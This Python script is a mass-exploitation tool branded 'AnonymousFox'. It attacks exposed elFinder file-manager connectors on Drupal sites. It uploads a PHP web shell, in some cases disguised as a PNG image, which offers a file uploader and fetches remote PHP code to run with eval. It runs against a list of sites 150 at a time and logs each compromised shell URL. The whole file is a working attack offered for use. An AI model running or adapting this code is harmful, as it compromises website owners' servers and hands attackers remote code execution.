import sys , requests, re , socket , random , string , base64
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init
import hashlib
init(autoreset=True)

fr  =   Fore.RED
fg  =   Fore.GREEN

print """  
  [#] Create By ::
	  ___                                                    ______        
	 / _ \                                                   |  ___|       
	/ /_\ \_ __   ___  _ __  _   _ _ __ ___   ___  _   _ ___ | |_ _____  __
	|  _  | '_ \ / _ \| '_ \| | | | '_ ` _ \ / _ \| | | / __||  _/ _ \ \/ /
	| | | | | | | (_) | | | | |_| | | | | | | (_) | |_| \__ \| || (_) >  < 
	\_| |_/_| |_|\___/|_| |_|\__, |_| |_| |_|\___/ \__,_|___/\_| \___/_/\_\ 
	                          __/ |
	                         |___/ El Finder
"""

requests.urllib3.disable_warnings()

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')


shell_mkfile = """<?php $system = $_GET['f']; if($system == 'f'){$saw1 = $_FILES['file']['tmp_name'];$saw2 = $_FILES['file']['name'];echo "<form method='POST' enctype='multipart/form-data'><input type='file'name='file' /><input type='submit' value='file' /></form>"; move_uploaded_file($saw1,$saw2);} ?><?php error_reporting(0); echo "AnonymousFox "; $code = $_GET["php"]; if (empty($code) or !stristr($code, "http")){ exit; } else { $php=file_get_contents($code); if (empty($php)){ $php = curl($code); } $php=str_replace("<?php", "", $php); $php=str_replace("<?php", "", $php); $php=str_replace("?>", "", $php); eval($php); } function curl($url) { $curl = curl_init(); curl_setopt($curl, CURLOPT_TIMEOUT, 40); curl_setopt($curl, CURLOPT_RETURNTRANSFER, TRUE); curl_setopt($curl, CURLOPT_URL, $url); curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"); curl_setopt($curl, CURLOPT_FOLLOWLOCATION, TRUE); if (stristr($url,"https://")) { curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0); } curl_setopt($curl, CURLOPT_HEADER, false); return curl_exec ($curl); } ?>"""
shell_upload = """<?php $system = $_GET['f']; if($system == 'f'){$saw1 = $_FILES['file']['tmp_name'];$saw2 = $_FILES['file']['name'];echo "<form method='POST' enctype='multipart/form-data'><input type='file'name='file' /><input type='submit' value='file' /></form>"; move_uploaded_file($saw1,$saw2);} ?><?php error_reporting(0); echo "AnonymousFox "; $code = $_GET["php"]; if (empty($code) or !stristr($code, "http")){ exit; } else { $php=file_get_contents($code); if (empty($php)){ $php = curl($code); } $php=str_replace("<?php", "", $php); $php=str_replace("<?php", "", $php); $php=str_replace("?>", "", $php); eval($php); } function curl($url) { $curl = curl_init(); curl_setopt($curl, CURLOPT_TIMEOUT, 40); curl_setopt($curl, CURLOPT_RETURNTRANSFER, TRUE); curl_setopt($curl, CURLOPT_URL, $url); curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"); curl_setopt($curl, CURLOPT_FOLLOWLOCATION, TRUE); if (stristr($url,"https://")) { curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0); } curl_setopt($curl, CURLOPT_HEADER, false); return curl_exec ($curl); } ?>"""
rz = shell_upload
login = rz

headers = {'Connection': 'keep-alive',
			'Cache-Control': 'max-age=0',
			'Upgrade-Insecure-Requests': '1',
			'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
			'Accept-Encoding': 'gzip, deflate',
			'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'www.google.com'}

def ran(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))

def URLdomain(site):
    if 'http://' not in site and 'https://' not in site :
        site = 'http://'+site
    if site[-1]  is not '/' :
        site = site+'/'
    return site

def domain(site):
    if site.startswith("http://") :
        site = site.replace("http://","")
    elif site.startswith("https://") :
        site = site.replace("https://","")
    if 'www.' in site :
        site = site.replace("www.", "")
    site = site.rstrip()
    if site.split('/') :
        site = site.split('/')[0]
    while site[-1] == "/":
        pattern = re.compile('(.*)/')
        sitez = re.findall(pattern,site)
        site = sitez[0]
    return site

def addWWW(site):
    if site.startswith("http://"):
        site = site.replace("http://", "http://www.")
    elif site.startswith("https://"):
        site = site.replace("https://", "https://www.")
    else :
        site = 'http://www.'+site
    return site

def connector_minimal(url) :
    uploader = 'AnonymousFox'
    shell = 'AnonymousFox'
    p1 = url.replace("connectors/php/connector.php", "files/")
    p2 = url.replace('sites/all/libraries/elfinder/connectors/php/connector.php', '')
    sh = rz
    try :
        filename = ran(10) + '.php'
        print filename
        FileWithLoccation = '../../files/' + filename 
        filename_encode = hashlib.md5(FileWithLoccation.encode()).hexdigest()
        mkfile = requests.get(url + "?cmd=mkfile&name={}&current=8ea8853cb93f2f9781e0bf6e857015ea".format(filename), headers=headers, verify=False,timeout=30).content
        filedata = {'cmd': 'edit', 'target': '{}'.format(filename_encode), 'current':'8ea8853cb93f2f9781e0bf6e857015ea','content': shell_mkfile}
        put_contents = requests.post(url, data=filedata, headers=headers, verify=False, timeout=30).content
        newShell = url.replace("connectors/php/connector.php", "files/{}".format(filename))
        check = requests.get(newShell+'?getShell', headers=headers, verify=False, timeout=15).content
        if 'AnonymousFox' in check:
                uploader = p1 + filename
                shell = p2 + filename
        else :
            filename = ran(10) + '.php'
            print filename
            filedata = "--------------------------66e3ca93281c7050\r\nContent-Disposition: form-data; name=\"cmd\"\r\n\r\nupload\r\n--------------------------66e3ca93281c7050\r\nContent-Disposition: form-data; name=\"current\"\r\n\r\n8ea8853cb93f2f9781e0bf6e857015ea\r\n--------------------------66e3ca93281c7050\r\nContent-Disposition: form-data; name=\"upload[]\"; filename=\"" + filename + "\"\r\nContent-Type: image/png\r\n\r\n\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x01^\x00\x00\x01^\x04\x03\x00\x00\x00?\x05j)\x00\x00\x00\x1ePLTE\xff\xff\xff\xef\xef\xef\xe5\xe5\xe5\xce\xce\xce\xa1\xa1\xa1iiiVVVGGG333\x00\x00\x00g\x00\xcc\xe2\x00\x00\r\xc0IDATx\xda\xed]K[\xdb\xc8\x12m\xc9\xce^\xc6\x90\xbb58\t\xdc\x9dm\x9c\t\xd9\xd9X\x1e\xc2\x8e\x87I\xc22\t!\x93\xe5@xmc\x02\xf1\xda\x0f\xa9\xff\xed]`\xeb\xddVU\xc9C\xb5\xe6\xa2-\xd4\xa7\xf2Q\xe9\xa8\x1fuN\x8b\xdf\xb9\xba\xee\x84\xbc\"^\xd7\x83\xc7\x8f\xbc\x9a\x08\xa7\xb1F\xbb\xaa\x97\xf4\xc8:5\xf2^L,A\xbb\x8cSr\xe4\x055\xd2\xbc\x17\x0eC\xbe\xe4H\xf3NL*\x8f\x8f\xd2i\xbe\xf05Y\xf05\xffM\xf5[*\x95J\xb9\xc1\xb7\xdc\xb4\x8f\xde\x9f\x1e\xf5\xec\x86\x95\x83\xfa\xadv\xff\x92\xd3\xcb\xfd\xba]\xd1\x86\x1f\x92Q2\xeck\x19\xb8\xdc\x93FB\xa4>\xf5[\xde\x91\x91k\xd2\xd1\x18\xdf\xeaG\x19\xbb\xdcCK\xd7\xfa-\x97\x12\x90\xb0.\xfcP>\x9629a-\xf9\xd7\xdc\x95\x8a\xcb\xdd\xd6\x11\xdf\x1d\xa9\xbc&5\xfd\xea\xf7\xe5@\x9d\xaf\xbc\xad\xe8\xc6\x0f\x85c9\xef:\xd0\x8c\x8d\x9d\xb9\xe9J\xa7\xa6\x17\xbe\xcb\x83\xf9\xf9\xca[\xad\xea\xd7\xd8MIW\xba-\x9d\xf8\xe1\x85L\xbdn-}\xf87\x1d^)eK\x1f|\x97\x01\xe9\xfa\x15\xcc_\xbf\x10x\xa5[\xd3\x85\x1f\n\x03H\xbe\xf2\\\x17\xfe}\x03JW\x8e+z\xe0k\x1c\xc3\xf2\x95m=\xea\xb7\x08LW\x8e\xf4\xe0\x87-h\xbe\xd3{1\xf3\xaf\t-\x07)\xf7t\xc0\x17\\\x0eR\xf6u\xa8\xdfux\xbe\x0f\x8b\xb7\xbc\xfc\x00\xfa\x16\x87\xbe\xc9\xbc\xfc\x0b\xfcX<\\\x9f\xf8\xf1E\x94\xef\x94\xd1x\xeb\xf7\r&\xdf\xb1\xc5\xce\x0f\x98\xf2\x95\xb2\xc6\xcd\xbf\xc6wT\xbe\xfb\xdc\xf8\x16P\xe9\xca\x9f\xdc\xf5\xbb\x8c\xcbw\xc4\xcd\x0f\x1b\xb8|\xc7\x163\xff\xbe\xc5\xe5\xeb\xd6x\xf15p\xf4 e\x8b\xb7~\x91\xf4 e\x9b\x97\x1f\xcc\x012\xdf\xbfy\xf9\x17IgR\xf6y\xf1]\xc6\xe6;\xe4\xad\xdfg\xd8|G\x16+?\xac`\xf3\x1d\xf3\xf2\xef::_^|\xb7\xb0\xf9:\x16k\xfd\xbe\xc5\xe6\xebV\xb2\xf0Yf|\xf1\xf9\xd6X\xf1\xc5~\x8e\xa5\xcc\x19\xbe2o\xf8\xd6\x84q\xc9\x87/%_\xf3k\x8e\xf8![=<>\xbe\xcc\xfc@\xe13\xce\xef\x1b\xe5{\xc1\x89\xef\x066\xdf\t/\xffR\xc6;\x9c\xf8\xaeP\xc6\xbf\x8c\xf8\xe2\xc7\xeb\xbc\xf3\x8b\"z>\xc4\x8b\xef#\xcf73\xe3\x8b\x9e\xcf\x12\xac\xf8\x1a\xc7\xc8|\x99\xd7w\x04a=\x8a\x13_\xf4z_\x85\x19\xdfW\xf8\xf5T\xce\xf1/e\xbd\x9as\xfc\x8b%\xb43\xc1\x8c/\x92 \xf6\xd8\xf7\xe7\xf1\xfbY\xbc\xfbo\xaf\xb0\xaf\x1b\xf3\xfe&j\x041\x14\xec\xfb\xc7\xe6\r\"\xdf\x03\xc1\xdf\x1f\xb5\x8b,_\xee\xfe(D\x01?tt1\xf7\x97<f?\xccB\xfa\xa3\x8e1\x83\x1d\r\xfaS\xd7\x11sc\x1d\xf0-\xe2\xca\x81\xbd\xbf\x0f\xbc'\xdb\x8eF\xf2\xe0+\xfe\xc0\xf5{\xb2\xf7\xa7\x16`\x9f\x8c\xcfB\x13|\xc5;\xd0\xcePM\xe8Q\xbfB\x14\x07\xf0\xb7M\x0b}\x00\xe0\x8ds\xeb\xde/\xe5\xd7\xb7,\xa7\x03|+4\xc2\xd7H\xad`\xb7\xb6\x88|\x17\xa6\x1fJ\xad\xe0sK\x11\xc9\x82o*\x07\x8f\x03z'-\xf4\xb1)z\xb2mu$\x0f\xbe\xf3_\xb9\x1f\xd6\x9cH\x16|\x85x\x9d\xfe%\xd6\x86\x1f\x84\x10\xc2Tr\xc4\xa4\x1d\xfe\xa5\x9a\xe8\xbb\x0b\xef@\xf2X}\xfc\t\xca\x1f\x93\xd3]\x9c^z\xc1\xfa\xf9$\x84\x9d\x8e\x05\x88d\xc1W\x88\xa5n\x94%~m\xc7#5\xf2\xd70\x9a\xa1\x9apz\x15h$\x0b\xbeB\x88B\xf3\xc3\x0c\xe3\xbb^\x03\x13\xc9\x81\xaf\x10B\x946\xedn\xf7\xa8kw\xd6p\xbf\x94\x07\xdfi\xceB\xfd\xd7\xbc\xf9\x1b\xe5\xcd'o\xfeFF\xde\xf0\xfd\xf2\xe7rVK\xb4k\xe9\xb4B\x8d\xbc\xa4\xde\xb3p/\xdc\xafG\xb4\xeb\xfd\xe0\xe8\xf1#'B\xdeS\xbd\xf4\xe45\xd5\xbf\xcf\xa5\xde\xf3\xda\x11\x0e\xd9K\xef\x94\x1c\xf9m\x8d\x1ay\x97\xb3\xf7\xed>\x83\x1f\xde\xd3\xf7\xed\xe9\xfb\xf6\xf4}\x8b\xfcimssss\xcd\xcaE\xfd\x1ae\xfb\xfd\xf5@J\xf7\xfe\xc8n\xe8?\xfe-\x07\xad\xf4\xeez\xab\xda\xe0\x9b<\xbfhF\x16/~u,\x8d\xf15^\x0f\xe26o\x15m\xeb\xd7\xf83ie(\xb6\x18\xa0\x0b?$\xa7+e\xcf\xd2\x92\r\xe5Rl\xc4\xaaP\x13|\xd5\xd6t\xee\xbe\x86\xf5[\x9c\xb3\x9d\xeb\xd4\xb5\xe3\x07s\xeef\xe3\xa8\xa2\x1b\xff\xbe\x9e\xbf\xb3t\xa8\x19\xbei\x9b\xfbA/H\x1d\xea\xf7\x1d|#W\x07~H\xdf\xda\x0f:\xff\xf1\xf3/\xa0u\xe2V#|!\x9d\x13>\xc0\xfc\xf5\xfbN\xa2:=\xb8\xf9\x01\xd6\xf9\xe3\xf5\"\xb0\xf3/\xb0\xf7\xf2\xb3&\xf8B\x9b\xc9\xc7\x96\x1e\xf5\x0b\xee\x0cl\xe9" + shell_upload + "\r\n--------------------------66e3ca93281c7050--\r\n"
            headers_up = {'Connection': 'keep-alive',
                       'Cache-Control': 'max-age=0',
                       'Upgrade-Insecure-Requests': '1',
                       'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
                       'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                       'Accept-Encoding': 'gzip, deflate',
                       'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
                       "Content-Type": "multipart/form-data; boundary=------------------------66e3ca93281c7050",
                       'referer': 'www.google.com'}
            up = requests.post(url, data=filedata, headers=headers_up, verify=False, timeout=30).content
            newShell = url.replace("connectors/php/connector.php", "files/{}".format(filename))
            check = requests.get(newShell+'?getShell', headers=headers, verify=False, timeout=15).content
            if 'AnonymousFox' in check:
                    uploader = p1 + filename
                    shell = p2 + filename
    except:
        pass
    return uploader, shell

def exploit(url) :
    try :
        dom = domain(url)
        url = URLdomain(url)
        try:
            socket.gethostbyname(dom)
        except:
            print ' -| ' + url + ' --> {}[DomainNotwork]'.format(fr)
            return
        inj = url + "sites/all/libraries/elfinder/connectors/php/connector.php"
        check = requests.get(inj, headers=headers, verify=False, timeout=15).status_code
        if check == 200 :
            newShell = connector_minimal(inj)
            if newShell[0] != 'AnonymousFox' :
                open('uploader.txt', 'a').write(newShell[0] +' \n')
                
                print ' -| ' + url + '--> {}[Succefully]'.format(fg)
            elif 'http://' in inj :
                inj2 = inj.replace("http://", "https://")
                newShell = connector_minimal(inj2)
                if newShell[0] != 'AnonymousFox' :
                    open('uploader.txt', 'a').write(newShell[0] + '\n')
                    
                    print ' -| ' + url + '--> {}[Succefully]'.format(fg)
                elif 'www.' not in inj :
                    inj3 = addWWW(inj)
                    newShell = connector_minimal(inj3)
                    if newShell[0] != 'AnonymousFox' :
                        open('uploader.txt', 'a').write(newShell[0] + '\n')
                        
                        print ' -| ' + url + '--> {}[Succefully]'.format(fg)
                    elif 'http://' in inj and 'www.' not in inj :
                        inj4 = inj.replace("http://", "https://")
                        inj4 = addWWW(inj4)
                        newShell = connector_minimal(inj4)
                        if newShell[0] != 'AnonymousFox' :
                            open('uploader.txt', 'a').write(newShell[0] + '\n')
                            
                            print ' -| ' + url + '--> {}[Succefully]'.format(fg)
                        else :
                            print ' -| ' + url + '--> {}[Failed7]'.format(fr)
                    else :
                        print ' -| ' + url + '--> {}[Failed6]'.format(fr)
                else :
                    print ' -| ' + url + '--> {}[Failed5]'.format(fr)
            elif 'www.' not in inj :
                inj3 = addWWW(inj)
                newShell = connector_minimal(inj3)
                if newShell[0] != 'AnonymousFox' :
                    open('uploader.txt', 'a').write(newShell[0] + '\n')
                    
                    print ' -| ' + url + '--> {}[Succefully]'.format(fg)
                else :
                    print ' -| ' + url + '--> {}[Failed4]'.format(fr)
            else :
                print ' -| ' + url + '--> {}[Failed3]'.format(fr)
        else :
            print ' -| ' + url + '--> {}[Failed2]'.format(fr)
    except :
        print ' -| ' + url + '--> {}[Failed1]'.format(fr)

mp = Pool(150)
mp.map(exploit, target)
mp.close()
mp.join()